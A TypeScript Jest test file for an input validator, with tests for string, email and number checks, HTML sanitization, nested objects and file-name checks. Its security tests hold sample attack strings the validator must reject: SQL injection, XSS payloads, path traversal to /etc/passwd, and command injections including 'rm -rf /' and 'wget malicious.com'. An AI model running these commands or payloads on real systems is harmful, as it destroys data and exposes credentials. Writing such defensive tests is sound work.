/**
 * Input Validation and Sanitization Tests
 * Phase 1.8 from Plan 10: TDD Red Phase
 * 
 * Tests for comprehensive input validation and data sanitization
 */

import { InputValidator, ValidationRule, SanitizationOptions } from '../../src/server/services/input-validator';

describe('InputValidator', () => {
    let validator: InputValidator;

    beforeEach(() => {
        validator = new InputValidator();
    });

    describe('🔴 Red Phase: Basic Validation', () => {
        it('should reject null and undefined inputs', () => {
            expect(() => validator.validate(null)).toThrow('Input cannot be null or undefined');
            expect(() => validator.validate(undefined)).toThrow('Input cannot be null or undefined');
        });

        it('should validate string length constraints', () => {
            const rules: ValidationRule[] = [
                { type: 'string', minLength: 3, maxLength: 10 }
            ];

            expect(() => validator.validate('ab', rules)).toThrow('String length must be between 3 and 10');
            expect(() => validator.validate('this is too long', rules)).toThrow('String length must be between 3 and 10');
            expect(validator.validate('valid', rules)).toBe(true);
        });

        it('should validate email format', () => {
            const rules: ValidationRule[] = [
                { type: 'email' }
            ];

            expect(() => validator.validate('invalid-email', rules)).toThrow('Invalid email format');
            expect(() => validator.validate('test@', rules)).toThrow('Invalid email format');
            expect(validator.validate('test@example.com', rules)).toBe(true);
        });

        it('should validate numeric ranges', () => {
            const rules: ValidationRule[] = [
                { type: 'number', min: 1, max: 100 }
            ];

            expect(() => validator.validate(0, rules)).toThrow('Number must be between 1 and 100');
            expect(() => validator.validate(101, rules)).toThrow('Number must be between 1 and 100');
            expect(validator.validate(50, rules)).toBe(true);
        });
    });

    describe('🔴 Red Phase: Security Validation', () => {
        it('should detect SQL injection attempts', () => {
            const maliciousInputs = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "'; SELECT * FROM passwords; --"
            ];

            maliciousInputs.forEach(input => {
                expect(() => validator.validateSecurity(input)).toThrow('Potential SQL injection detected');
            });
        });

        it('should detect XSS script injections', () => {
            const xssInputs = [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(1)">',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)"></iframe>'
            ];

            xssInputs.forEach(input => {
                expect(() => validator.validateSecurity(input)).toThrow('Potential XSS attack detected');
            });
        });

        it('should detect path traversal attempts', () => {
            const pathTraversalInputs = [
                '../../../etc/passwd',
                '..\\..\\windows\\system32',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
                '....//....//....//etc/passwd'
            ];

            pathTraversalInputs.forEach(input => {
                expect(() => validator.validateSecurity(input)).toThrow('Potential path traversal detected');
            });
        });

        it('should detect command injection attempts', () => {
            const commandInjectionInputs = [
                '; cat /etc/passwd',
                '| rm -rf /',
                '&& wget malicious.com',
                '`rm -rf /`'
            ];

            commandInjectionInputs.forEach(input => {
                expect(() => validator.validateSecurity(input)).toThrow('Potential command injection detected');
            });
        });
    });

    describe('🔴 Red Phase: Data Sanitization', () => {
        it('should sanitize HTML tags from input', () => {
            const input = '<p>Hello <script>alert("xss")</script> World</p>';
            const expected = 'Hello  World';

            expect(validator.sanitize(input, { removeHtml: true })).toBe(expected);
        });

        it('should escape special characters', () => {
            const input = 'Hello "World" & <Company>';
            const expected = 'Hello &quot;World&quot; &amp; &lt;Company&gt;';

            expect(validator.sanitize(input, { escapeHtml: true })).toBe(expected);
        });

        it('should trim whitespace', () => {
            const input = '  hello world  ';
            const expected = 'hello world';

            expect(validator.sanitize(input, { trim: true })).toBe(expected);
        });

        it('should normalize unicode characters', () => {
            const input = 'café'; // Contains unicode

            const result = validator.sanitize(input, { normalizeUnicode: true });
            expect(result).toBeDefined();
            expect(typeof result).toBe('string');
        });

        it('should remove or replace dangerous patterns', () => {
            const input = 'Hello javascript:alert(1) world';
            const expected = 'Hello world'; // After cleaning and space normalization

            expect(validator.sanitize(input, { removeDangerousPatterns: true })).toBe(expected);
        });
    });

    describe('🔴 Red Phase: Complex Validation Scenarios', () => {
        it('should validate and sanitize user registration data', () => {
            const userData = {
                username: '  TestUser123  ',
                email: 'test@example.com',
                password: 'SecurePass123!',
                bio: '<p>Hello I am a developer</p>' // Use safe HTML for this test
            };

            const rules = {
                username: [{ type: 'string', minLength: 3, maxLength: 20 }],
                email: [{ type: 'email' }],
                password: [{ type: 'string', minLength: 8 }],
                bio: [{ type: 'string', maxLength: 500 }]
            };

            const sanitizeOptions = {
                username: { trim: true },
                bio: { removeHtml: true, trim: true }
            };

            const result = validator.validateAndSanitizeObject(userData, rules, sanitizeOptions);

            expect(result.username).toBe('TestUser123');
            expect(result.email).toBe('test@example.com');
            expect(result.bio).toBe('Hello I am a developer');
        });

        it('should handle nested object validation', () => {
            const data = {
                user: {
                    name: 'John Doe',
                    contact: {
                        email: 'john@example.com',
                        phone: '+1234567890'
                    }
                }
            };

            const rules = {
                'user.name': [{ type: 'string', minLength: 2 }],
                'user.contact.email': [{ type: 'email' }],
                'user.contact.phone': [{ type: 'string', pattern: /^\+\d{10,15}$/ }]
            };

            expect(validator.validateNestedObject(data, rules)).toBe(true);
        });

        it('should validate array inputs', () => {
            const tags = ['javascript', '<script>alert(1)</script>', 'python', 'react'];
            const rules: ValidationRule[] = [
                { type: 'string', maxLength: 20 }
            ];

            expect(() => validator.validateArray(tags, rules)).toThrow('Potential XSS attack detected');

            const safeTags = ['javascript', 'python', 'react'];
            expect(validator.validateArray(safeTags, rules)).toBe(true);
        });
    });

    describe('🔴 Red Phase: Performance and Edge Cases', () => {
        it('should handle large inputs efficiently', () => {
            const largeInput = 'a'.repeat(10000);
            const startTime = Date.now();

            const result = validator.sanitize(largeInput, { trim: true });
            const endTime = Date.now();

            expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
            expect(result).toBe(largeInput); // No trimming needed
        });

        it('should handle special unicode characters safely', () => {
            const unicodeInput = '🚀💻🔒🌟';

            expect(() => validator.validateSecurity(unicodeInput)).not.toThrow();
            expect(validator.sanitize(unicodeInput, { normalizeUnicode: true })).toBeDefined();
        });

        it('should handle very long malicious payloads', () => {
            const longPayload = '<script>alert("xss")</script>'.repeat(1000);

            expect(() => validator.validateSecurity(longPayload)).toThrow('Potential XSS attack detected');
        });

        it('should validate file upload names', () => {
            const dangerousNames = [
                '../../../etc/passwd',
                'file.php.jpg', // 檔案會被 .php 檢測到
                'script.js',
                '.htaccess',
                'web.config'
            ];

            // Test path traversal
            expect(() => validator.validateFileName('../../../etc/passwd')).toThrow();

            // Test dangerous extensions
            expect(() => validator.validateFileName('script.js')).toThrow();
            expect(() => validator.validateFileName('file.php')).toThrow();

            // Test system files
            expect(() => validator.validateFileName('.htaccess')).toThrow();
            expect(() => validator.validateFileName('web.config')).toThrow();

            const safeName = 'document.pdf';
            expect(validator.validateFileName(safeName)).toBe(true);
        });
    });
});
